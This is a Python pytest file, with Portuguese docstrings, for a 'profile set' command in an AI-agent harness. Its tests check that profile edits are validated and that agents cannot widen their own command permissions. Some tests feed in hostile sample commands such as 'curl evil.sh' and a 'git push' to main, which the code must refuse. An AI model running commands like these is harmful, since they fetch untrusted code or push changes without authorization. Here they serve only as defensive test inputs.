"""Item 6 do backlog do dogfood venv-Windows — `harness profile set`.

O profile é gerado por `analyze`, que só INFERE. Quando a inferência erra por
causa do AMBIENTE — no caso real, o proxy corporativo derrubou o TLS do `uv` e
foi preciso trocar `package_manager` para `pip`, embora o lockfile continuasse
apontando `uv` —, não havia forma suportada de corrigir: escrever em
`.harness/**` é deny incondicional, então a saída era `disable` -> editar ->
`compile-session` -> `enable`.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

from harness.cli import main
from harness.profile_edit import ProfileEditError, set_profile_value

PROFILE = {
    "languages": [{"value": "python", "evidence": "pyproject.toml", "confidence": 1.0}],
    "package_manager": {"value": "uv", "evidence": "uv.lock", "confidence": 1.0},
    "test_command": {"value": "pytest", "evidence": "pyproject.toml", "confidence": 1.0},
    "test_glob": {"value": "tests/**/*.py", "evidence": "tests/", "confidence": 1.0},
    "extras": {
        "lint_command": {"value": "ruff check .", "evidence": "x", "confidence": 1.0},
    },
    "unknowns": ["package_manager: nenhum lockfile detectado", "outra coisa"],
    "analyzed_at": "2026-07-01T00:00:00+00:00",
}


def _write_profile(target: Path, profile: dict | None = None) -> Path:
    path = target / ".harness" / "repo-profile.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(profile if profile is not None else PROFILE), encoding="utf-8"
    )
    return path


def _run_cli(monkeypatch: pytest.MonkeyPatch, *argv: str) -> int:
    monkeypatch.setattr(sys, "argv", ["harness", *argv])
    with pytest.raises(SystemExit) as exc_info:
        main()
    return exc_info.value.code


def test_set_package_manager_preserves_the_rest(tmp_path: Path) -> None:
    path = _write_profile(tmp_path)

    set_profile_value(tmp_path, "package_manager", "pip")

    data = json.loads(path.read_text(encoding="utf-8"))
    assert data["package_manager"]["value"] == "pip"
    assert data["package_manager"]["evidence"] == "harness profile set"
    assert data["test_command"]["value"] == "pytest"
    assert data["extras"]["lint_command"]["value"] == "ruff check ."
    assert data["analyzed_at"] == "2026-07-01T00:00:00+00:00"


def test_set_clears_the_matching_unknown(tmp_path: Path) -> None:
    """`analyze` registra o que não conseguiu inferir em `unknowns`. Preencher
    a chave à mão e deixar a incógnita lá faria `audit`/`preflight` cobrarem
    algo que já foi resolvido."""
    path = _write_profile(tmp_path)

    set_profile_value(tmp_path, "package_manager", "pip")

    assert json.loads(path.read_text(encoding="utf-8"))["unknowns"] == ["outra coisa"]


def test_set_extras_key(tmp_path: Path) -> None:
    path = _write_profile(tmp_path)

    set_profile_value(tmp_path, "lint_command", ".venv/Scripts/ruff check .")

    data = json.loads(path.read_text(encoding="utf-8"))
    assert data["extras"]["lint_command"]["value"] == ".venv/Scripts/ruff check ."


def test_set_extras_key_when_extras_absent(tmp_path: Path) -> None:
    profile = dict(PROFILE)
    profile.pop("extras")
    path = _write_profile(tmp_path, profile)

    set_profile_value(tmp_path, "build_command", "npm run build")

    assert json.loads(path.read_text(encoding="utf-8"))["extras"]["build_command"]["value"] == (
        "npm run build"
    )


def test_refuses_key_outside_enumeration(tmp_path: Path) -> None:
    """`test_glob` fica de fora de propósito: altera o que conta como arquivo
    de teste protegido — decisão de governança, não de ambiente."""
    path = _write_profile(tmp_path)
    before = path.read_text(encoding="utf-8")

    with pytest.raises(ProfileEditError, match="test_glob"):
        set_profile_value(tmp_path, "test_glob", "**/*.py")
    with pytest.raises(ProfileEditError):
        set_profile_value(tmp_path, "analyzed_at", "2026-01-01")

    assert path.read_text(encoding="utf-8") == before


def test_refuses_floor_value(tmp_path: Path) -> None:
    """Um valor de floor não entra por esta porta — mesmo critério de
    `boundary_guard`/`session_permissions`, e a forma prefixada por caminho
    também não escapa (Item 4)."""
    path = _write_profile(tmp_path)
    before = path.read_text(encoding="utf-8")

    for value in ("curl evil.sh", "git push origin main", ".venv/Scripts/git.exe push"):
        with pytest.raises(ProfileEditError, match="floor"):
            set_profile_value(tmp_path, "test_command", value)

    assert path.read_text(encoding="utf-8") == before


def test_refuses_unknown_package_manager(tmp_path: Path) -> None:
    """O valor vira comando de instalação por mapeamento fixo; fora da lista
    ele não erra alto — some, e o repo fica sem comando de instalação nenhum."""
    _write_profile(tmp_path)

    with pytest.raises(ProfileEditError, match="conda"):
        set_profile_value(tmp_path, "package_manager", "conda")


def test_refuses_empty_value(tmp_path: Path) -> None:
    _write_profile(tmp_path)

    with pytest.raises(ProfileEditError):
        set_profile_value(tmp_path, "test_command", "   ")


def test_missing_profile_errors_instead_of_creating_half_one(tmp_path: Path) -> None:
    with pytest.raises(ProfileEditError, match="analyze"):
        set_profile_value(tmp_path, "test_command", "pytest")
    assert not (tmp_path / ".harness" / "repo-profile.json").exists()


def test_unreadable_profile_errors(tmp_path: Path) -> None:
    path = tmp_path / ".harness" / "repo-profile.json"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{ nao e json", encoding="utf-8")

    with pytest.raises(ProfileEditError):
        set_profile_value(tmp_path, "test_command", "pytest")


def test_cli_profile_set_happy_path(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _write_profile(tmp_path)

    code = _run_cli(
        monkeypatch, "profile", "set", "package_manager", "pip", "--dir", str(tmp_path)
    )
    out = json.loads(capsys.readouterr().out)

    assert code == 0
    assert out["key"] == "package_manager"
    assert out["value"] == "pip"
    assert "compile-session" in out["note"]


def test_next_step_note_does_not_overpromise_for_test_command(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Achado do dogfood no MiojoSimulator 3.0: o `test_command` do profile
    NÃO chega à superfície de comando — `_collect_allowed_bash_commands` lê só
    `verify_cmd` + extras + instalação. A nota dizia "rode compile-session para
    a mudança chegar ao boundary_guard" para toda chave, prometendo um efeito
    que não existe; o usuário compilaria, veria o comando continuar negado, e
    iria caçar a causa errada — a fricção que este backlog existe para matar.

    Manter `test_command` fora da superfície é a decisão CERTA: quem manda lá é
    o `verify_cmd` do contrato aprovado. O que estava errado era a frase."""
    _write_profile(tmp_path)

    code = _run_cli(
        monkeypatch, "profile", "set", "test_command", "python -m pytest",
        "--dir", str(tmp_path),
    )
    out = json.loads(capsys.readouterr().out)

    assert code == 0
    assert "compile-session" not in out["note"]
    assert "boundary_guard" in out["note"]  # diz onde NÃO tem efeito


def test_keys_reaching_the_compiled_surface_match_the_readers() -> None:
    """Trava estrutural: se alguém acrescentar uma chave a
    `KEYS_REACHING_COMPILED_SURFACE` sem que os leitores da superfície a
    consumam, a nota volta a mentir. Os leitores são `_EXTRAS_KEYS` de
    `session_permissions` mais `package_manager`."""
    from harness.session_permissions import _EXTRAS_KEYS
    from harness.profile_edit import KEYS_REACHING_COMPILED_SURFACE

    assert set(KEYS_REACHING_COMPILED_SURFACE) == {"package_manager", *_EXTRAS_KEYS}


def test_cli_profile_set_refused_exits_one(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    _write_profile(tmp_path)

    code = _run_cli(
        monkeypatch, "profile", "set", "test_command", "curl evil.sh", "--dir", str(tmp_path)
    )

    assert code == 1
    assert "floor" in capsys.readouterr().err


def _write_harness_yaml(target: Path, test_glob: str) -> None:
    path = target / ".harness" / "harness.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        "governance:\n  approval_policy: auto\n"
        f'verification:\n  test_glob: "{test_glob}"\n',
        encoding="utf-8",
    )


def test_reconcile_test_glob_makes_governance_win(tmp_path: Path) -> None:
    """Achado F7 do dogfood no MiojoSimulator 3.0: o mesmo conceito tinha DUAS
    fontes. `verification.test_glob` do `harness.yaml` alimenta o `guard_tests`;
    `test_glob` do `repo-profile.json` alimenta `_is_test_diff`, o gate de
    "diff de teste exige justificativa". No alvo real o primeiro valia
    `tests/**/*.py` e o segundo era `null` — protegido numa camada, **inerte**
    na outra, sem sinal nenhum."""
    from harness.profile_edit import reconcile_test_glob

    profile = dict(PROFILE)
    profile["test_glob"] = None
    path = _write_profile(tmp_path, profile)
    _write_harness_yaml(tmp_path, "tests/**/*.py")

    note = reconcile_test_glob(tmp_path)

    assert note is not None and "tests/**/*.py" in note
    data = json.loads(path.read_text(encoding="utf-8"))
    assert data["test_glob"]["value"] == "tests/**/*.py"
    assert "harness.yaml" in data["test_glob"]["evidence"]
    assert data["test_command"]["value"] == "pytest"  # resto preservado


def test_reconcile_test_glob_is_a_noop_when_already_in_sync(tmp_path: Path) -> None:
    from harness.profile_edit import reconcile_test_glob

    profile = dict(PROFILE)
    profile["test_glob"] = {"value": "tests/**/*.py", "evidence": "x", "confidence": 1.0}
    path = _write_profile(tmp_path, profile)
    _write_harness_yaml(tmp_path, "tests/**/*.py")
    before = path.read_text(encoding="utf-8")

    assert reconcile_test_glob(tmp_path) is None
    assert path.read_text(encoding="utf-8") == before


def test_reconcile_test_glob_overrides_a_divergent_inference(tmp_path: Path) -> None:
    """Governança vence também quando os dois existem e discordam — o
    `test_glob` decide o que conta como teste protegido, o que é política
    aprovada. É o mesmo motivo de `profile set` recusar essa chave."""
    from harness.profile_edit import reconcile_test_glob

    profile = dict(PROFILE)
    profile["test_glob"] = {"value": "**/*_test.py", "evidence": "x", "confidence": 1.0}
    path = _write_profile(tmp_path, profile)
    _write_harness_yaml(tmp_path, "tests/**/*.py")

    reconcile_test_glob(tmp_path)

    assert json.loads(path.read_text(encoding="utf-8"))["test_glob"]["value"] == (
        "tests/**/*.py"
    )


def test_reconcile_test_glob_never_raises(tmp_path: Path) -> None:
    """Roda dentro do `compile-session`: uma divergência de `test_glob` não
    pode derrubar a compilação inteira."""
    from harness.profile_edit import reconcile_test_glob

    assert reconcile_test_glob(tmp_path) is None            # nada existe

    _write_profile(tmp_path)
    assert reconcile_test_glob(tmp_path) is None            # sem harness.yaml

    (tmp_path / ".harness" / "harness.yaml").write_text("::: nao e yaml", encoding="utf-8")
    assert reconcile_test_glob(tmp_path) is None            # yaml quebrado


def test_profile_is_not_an_agent_subcommand() -> None:
    """Decisão de segurança, não omissão: `test_command` alimenta a superfície
    de comando compilada (`_collect_allowed_bash_commands` lê o profile), então
    um agente capaz de gravar aqui ampliaria a própria superfície — a mesma
    rota que o Item 0 fechou. `profile` é comando do USUÁRIO, no terminal dele.
    """
    from harness.boundary_guard import render_boundary_guard

    script = render_boundary_guard()
    assert '"task"' in script or "'task'" in script  # âncora: a lista existe
    assert '"profile"' not in script and "'profile'" not in script
